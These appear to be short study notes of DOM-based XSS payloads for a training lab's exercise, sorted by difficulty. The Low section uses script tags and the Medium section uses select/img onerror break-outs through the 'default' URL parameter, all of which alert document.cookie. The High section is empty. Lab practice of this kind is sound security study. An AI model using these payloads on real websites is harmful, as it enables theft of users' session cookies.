# XSS-DOM 
Difficulty: Low

<script>alert(document.cookie)</script>          </br>
<script>alert(1)</script>

Difficulty: Medium

/?default=<select><img title=<img src onerror=alert(document.cookie)></select>        </br>
/?default=<select><img src/onerror=alert(document.cookie)></select>                    </br>
Res: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Difficulty: High


